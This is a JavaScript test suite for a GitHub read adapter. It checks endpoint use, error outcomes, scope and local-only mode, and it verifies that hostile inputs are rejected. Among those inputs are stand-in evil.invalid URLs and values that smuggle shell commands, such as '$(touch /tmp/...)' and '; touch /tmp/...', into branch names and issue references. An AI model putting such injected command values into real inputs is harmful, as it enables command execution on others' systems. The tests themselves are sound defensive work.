test('readBranchHead returns the fixed GitHub branch ref commit for a nested encoded branch', async (t) => {
  const branch = 'release/v1@beta';
  const branchSha = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
  const scenario = normalGithubScenario();
  scenario.records['git/ref/heads/release/v1%40beta'] = {
    ref: `refs/heads/${branch}`,
    object: { type: 'commit', sha: branchSha },
    url: 'https://evil.invalid/branch-ref-url-must-not-be-followed',
  };
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-branch-head-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# local target\n' },
  });
  const gh = await makeGhFixture(t, scenario);
  t.after(() => rm(target.root, { recursive: true, force: true }));
  const localHead = target.revision;

  await withEnvironment({ ...gh.env, GH_HOST: 'enterprise.example.invalid' }, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    const result = await adapter.readBranchHead({ repository: 'example/consumer', branch });
    assert.equal(result, branchSha);
    assert.notEqual(result, localHead);
  });

  const commands = await readCommandLog(gh.log);
  const apiCommands = commands.filter((args) => args[0] === 'api');
  const endpoint = 'repos/example/consumer/git/ref/heads/release/v1%40beta';
  const branchCommand = apiCommands.find((args) => args.includes(endpoint));
  assert.ok(branchCommand);
  assert.ok(branchCommand.includes('--method'));
  assert.equal(branchCommand[branchCommand.indexOf('--method') + 1], 'GET');
  assert.ok(branchCommand.includes('--hostname'));
  assert.equal(branchCommand[branchCommand.indexOf('--hostname') + 1], 'github.com');
  assert.ok(branchCommand.includes('Accept: application/vnd.github.raw+json'));
  assert.ok(branchCommand.includes('X-GitHub-Api-Version: 2022-11-28'));
  assert.equal(branchCommand.some((value) => value.includes('evil.invalid')), false);
});

test('readBranchHead rejects malformed branch refs and preserves repository scope', async (t) => {
  const scenario = normalGithubScenario();
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-branch-invalid-input-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# local target\n' },
  });
  const gh = await makeGhFixture(t, scenario);
  t.after(() => rm(target.root, { recursive: true, force: true }));

  await withEnvironment(gh.env, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    await expectError(() => adapter.readBranchHead({ repository: 'example/outside', branch: 'main' }), 'reference-out-of-scope');
    for (const branch of [
      '',
      '-leading',
      'bad@{name}',
      'bad..name',
      'bad.',
      'bad/',
      'bad.lock',
      'bad\\name',
      'https://evil.invalid/ref',
      '$(touch /tmp/assuredloop-branch-should-not-run)',
    ]) {
      await expectError(() => adapter.readBranchHead({ repository: 'example/consumer', branch }), 'binding-invalid');
    }
  });
  assert.deepEqual(await readCommandLog(gh.log), []);
});

test('readBranchHead rejects a mismatched ref, non-commit object or invalid commit SHA', async (t) => {
  const branch = 'release/v1@beta';
  const branchEndpoint = 'git/ref/heads/release/v1%40beta';
  const cases = [
    {
      name: 'ref mismatch',
      response: {
        ref: 'refs/heads/main',
        object: { type: 'commit', sha: 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb' },
      },
    },
    {
      name: 'non-commit object',
      response: {
        ref: `refs/heads/${branch}`,
        object: { type: 'tree', sha: 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb' },
      },
    },
    {
      name: 'invalid commit SHA',
      response: {
        ref: `refs/heads/${branch}`,
        object: { type: 'commit', sha: 'not-a-commit-sha' },
      },
    },
  ];

  for (const current of cases) {
    const scenario = normalGithubScenario();
    scenario.records[branchEndpoint] = { ...current.response, url: 'https://evil.invalid/malformed-branch-ref' };
    const target = await makeGitFixture({
      prefix: `assuredloop-read-branch-malformed-${current.name.replaceAll(' ', '-')}-`,
      remote: 'https://github.com/example/consumer.git',
      files: { 'README.md': '# local target\n' },
    });
    const gh = await makeGhFixture(t, scenario);
    t.after(() => rm(target.root, { recursive: true, force: true }));

    await withEnvironment(gh.env, async () => {
      const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
      await expectError(
        () => adapter.readBranchHead({ repository: 'example/consumer', branch }),
        'record-unavailable',
        'invalid-response',
      );
    });
    const branchCalls = (await readCommandLog(gh.log)).filter((args) => args.includes(`repos/example/consumer/${branchEndpoint}`));
    assert.ok(branchCalls.length > 0, `${current.name} must exercise the fixed branch endpoint`);
  }
});

test('readRepository returns trusted metadata needed for current context', async (t) => {
  const metadata = {
    full_name: 'example/consumer',
    default_branch: 'release/v1@beta',
    private: true,
    html_url: 'https://evil.invalid/repository-url-must-not-be-followed',
  };
  const scenario = normalGithubScenario();
  scenario.repositoryMetadata = metadata;
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-repository-metadata-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# local target\n' },
  });
  const gh = await makeGhFixture(t, scenario);
  t.after(() => rm(target.root, { recursive: true, force: true }));

  await withEnvironment({ ...gh.env, GH_HOST: 'enterprise.example.invalid' }, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    const result = await adapter.readRepository('example/consumer');
    assert.equal(result.full_name, metadata.full_name);
    assert.equal(result.default_branch, metadata.default_branch);
    assert.equal(result.private, true);
  });

  const commands = await readCommandLog(gh.log);
  const apiCommands = commands.filter((args) => args[0] === 'api');
  const repositoryCommand = apiCommands.find((args) => args.includes('repos/example/consumer'));
  assert.ok(repositoryCommand);
  assert.equal(repositoryCommand.filter((value) => value === 'repos/example/consumer').length, 1);
  assert.ok(repositoryCommand.includes('--method'));
  assert.equal(repositoryCommand[repositoryCommand.indexOf('--method') + 1], 'GET');
  assert.ok(repositoryCommand.includes('--hostname'));
  assert.equal(repositoryCommand[repositoryCommand.indexOf('--hostname') + 1], 'github.com');
  assert.ok(repositoryCommand.includes('Accept: application/vnd.github.raw+json'));
  assert.ok(repositoryCommand.includes('X-GitHub-Api-Version: 2022-11-28'));
  assert.equal(repositoryCommand.some((value) => value.includes('evil.invalid')), false);
});

test('readRepository preserves missing or empty default_branch for caller context handling', async (t) => {
  const cases = [
    { name: 'missing', metadata: { full_name: 'example/consumer', private: false } },
    { name: 'empty', metadata: { full_name: 'example/consumer', default_branch: '', private: false } },
  ];
  for (const current of cases) {
    const scenario = normalGithubScenario();
    scenario.repositoryMetadata = current.metadata;
    const target = await makeGitFixture({
      prefix: `assuredloop-read-repository-${current.name}-branch-`,
      remote: 'https://github.com/example/consumer.git',
      files: { 'README.md': '# local target\n' },
    });
    const gh = await makeGhFixture(t, scenario);
    t.after(() => rm(target.root, { recursive: true, force: true }));

    await withEnvironment(gh.env, async () => {
      const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
      const result = await adapter.readRepository('example/consumer');
      assert.equal(result.full_name, 'example/consumer');
      assert.equal(result.default_branch, current.metadata.default_branch);
    });
  }
});

test('readRepository enforces scope, redirect identity and local-only no-GitHub behavior', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-repository-boundary-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# local target\n' },
  });
  const gh = await makeGhFixture(t, normalGithubScenario());
  t.after(() => rm(target.root, { recursive: true, force: true }));

  await withEnvironment(gh.env, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    await expectError(() => adapter.readRepository('example/outside'), 'reference-out-of-scope');
  });
  assert.deepEqual(await readCommandLog(gh.log), []);

  const redirectScenario = normalGithubScenario();
  redirectScenario.repositoryMetadata = { full_name: 'example/renamed', default_branch: 'main' };
  const redirectGh = await makeGhFixture(t, redirectScenario);
  await withEnvironment(redirectGh.env, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    await expectError(() => adapter.readRepository('example/consumer'), 'binding-invalid');
  });

  const localGh = await makeGhFixture(t, normalGithubScenario());
  await withEnvironment(localGh.env, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer', localOnly: true });
    await expectError(() => adapter.readRepository('example/consumer'), 'tool-unavailable');
  });
  assert.deepEqual(await readCommandLog(localGh.log), []);
});

test('readParent returns null for an absent parent after repository access is confirmed', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-parent-absent-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# consumer\n' },
  });
  const scenario = normalGithubScenario();
  delete scenario.records['issues/7/parent'];
  scenario.missing = ['issues/7/parent'];
  const gh = await makeGhFixture(t, scenario);
  t.after(() => rm(target.root, { recursive: true, force: true }));

  await withEnvironment(gh.env, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    assert.equal(await adapter.readParent('example/consumer#7'), null);
  });
});

test('readParent reports malformed JSON as unavailable evidence instead of absent relation', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-parent-invalid-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# consumer\n' },
  });
  const scenario = normalGithubScenario();
  scenario.rawResponses = { 'issues/7/parent': '{not-json\n' };
  const gh = await makeGhFixture(t, scenario);
  t.after(() => rm(target.root, { recursive: true, force: true }));

  await withEnvironment(gh.env, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    const error = await expectError(
      () => adapter.readParent('example/consumer#7'),
      'record-unavailable',
      'invalid-response',
    );
    assert.notEqual(error, null);
  });
});

test('Git object reads disable implicit lazy fetching', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-no-lazy-fetch-',
    remote: 'https://github.com/example/consumer.git',
    files: {
      'docs/raw.txt': 'raw bytes\n',
      'docs/other.txt': 'other bytes\n',
    },
  });
  const shim = await makeGitShim(t);
  t.after(() => rm(target.root, { recursive: true, force: true }));

  await withEnvironment(shim.env, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    await adapter.readBlob({ repository: 'example/consumer', revision: target.revision, path: 'docs/raw.txt' });
    await adapter.listFiles({ repository: 'example/consumer', revision: target.revision, path: 'docs' });
  });

  const commands = (await readFile(shim.log, 'utf8')).trim().split('\n').filter(Boolean).map((line) => JSON.parse(line));
  const objectReads = commands.filter(({ args }) => args.includes('cat-file') || args.includes('ls-tree'));
  assert.ok(objectReads.length > 0);
  assert.ok(objectReads.every(({ noLazyFetch }) => noLazyFetch === '1'));
});

test('GitHub tool failures remain tool-unavailable and preserve retry details', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-tool-outcomes-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# consumer\n' },
  });
  t.after(() => rm(target.root, { recursive: true, force: true }));
  const work = 'example/consumer#7';

  await withEnvironment(noGhEnvironment(), async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    await expectError(() => adapter.readIssue(work), 'tool-unavailable', 'missing-binary');
  });

  const cases = [
    { scenario: { ...normalGithubScenario(), version: '2.87.0' }, reason: 'unsupported-version' },
    { scenario: { ...normalGithubScenario(), auth: 'fail' }, reason: 'authentication-required' },
    { scenario: { ...normalGithubScenario(), mode: 'forbidden' }, reason: 'insufficient-access' },
    { scenario: { ...normalGithubScenario(), mode: 'transport' }, reason: 'transport-error' },
  ];
  for (const { scenario, reason } of cases) {
    const gh = await makeGhFixture(t, scenario);
    await withEnvironment(gh.env, async () => {
      const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
      await expectError(() => adapter.readIssue(work), 'tool-unavailable', reason);
    });
  }

  const limited = await makeGhFixture(t, { ...normalGithubScenario(), mode: 'rate-limited' });
  await withEnvironment(limited.env, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    const error = await expectError(() => adapter.readIssue(work), 'tool-unavailable', 'rate-limited');
    assert.equal(error.details.retry_after_seconds, 120);
  });

  const access404 = await makeGhFixture(t, { ...normalGithubScenario(), mode: 'access-404' });
  await withEnvironment(access404.env, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    await expectError(() => adapter.readIssue(work), 'tool-unavailable', 'insufficient-access');
  });
});

test('a confirmed repository with a missing issue reports record-unavailable', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-record-outcome-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# consumer\n' },
  });
  const gh = await makeGhFixture(t, { ...normalGithubScenario(), missing: ['issues/7'] });
  t.after(() => rm(target.root, { recursive: true, force: true }));

  await withEnvironment(gh.env, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    await expectError(() => adapter.readIssue('example/consumer#7'), 'record-unavailable');
  });
});

test('a resource 404 after access is lost remains tool-unavailable after rechecking metadata access', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-access-loss-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# consumer\n' },
  });
  const gh = await makeGhFixture(t, {
    ...normalGithubScenario(),
    mode: 'access-lost-after-record-404',
  });
  t.after(() => rm(target.root, { recursive: true, force: true }));

  await withEnvironment(gh.env, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    const error = await expectError(() => adapter.readIssue('example/consumer#7'), 'tool-unavailable', 'insufficient-access');
    assert.notEqual(error.code, 'record-unavailable');
  });
  const commands = await readCommandLog(gh.log);
  const metadataCalls = commands.filter((args) => args[0] === 'api' && args.includes('repos/example/consumer') &&
    !args.some((value) => value.startsWith('repos/example/consumer/')));
  assert.equal(metadataCalls.length, 2);
});

test('a GitHub repository redirect or rename is a binding-invalid result', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-redirect-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# consumer\n' },
  });
  const gh = await makeGhFixture(t, {
    ...normalGithubScenario(),
    full_name: 'example/renamed-consumer',
  });
  t.after(() => rm(target.root, { recursive: true, force: true }));

  await withEnvironment(gh.env, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    await expectError(() => adapter.readIssue('example/consumer#7'), 'binding-invalid');
  });
});

test('local-only mode reads local blobs, skips every gh invocation and cannot read remote records', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-local-only-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'docs/local.txt': Buffer.from('local\r\nπ', 'utf8') },
  });
  const gh = await makeGhFixture(t, normalGithubScenario());
  t.after(() => rm(target.root, { recursive: true, force: true }));

  await withEnvironment({ ...gh.env, PATH: gh.env.PATH }, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer', localOnly: true });
    assert.deepEqual(
      await adapter.readBlob({ repository: 'example/consumer', revision: target.revision, path: 'docs/local.txt' }),
      Buffer.from('local\r\nπ', 'utf8'),
    );
    await expectError(() => adapter.readIssue('example/consumer#7'), 'tool-unavailable');
  });
  assert.deepEqual(await readCommandLog(gh.log), []);
});

test('hostile work references are rejected before they can become shell commands or URLs', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-hostile-work-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# consumer\n' },
  });
  const gh = await makeGhFixture(t, normalGithubScenario());
  t.after(() => rm(target.root, { recursive: true, force: true }));

  await withEnvironment(gh.env, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    await expectError(() => adapter.readIssue('https://evil.invalid/repos/example/consumer/issues/7'), 'binding-invalid');
    await expectError(() => adapter.readIssue('example/consumer#7; touch /tmp/assuredloop-should-not-exist'), 'binding-invalid');
    await expectError(() => adapter.listTimeline('example/consumer#7; touch /tmp/assuredloop-should-not-exist'), 'binding-invalid');
  });
  const commands = await readCommandLog(gh.log);
  assert.equal(commands.some((args) => args.some((value) => value.includes('evil.invalid') || value.includes('touch'))), false);
});
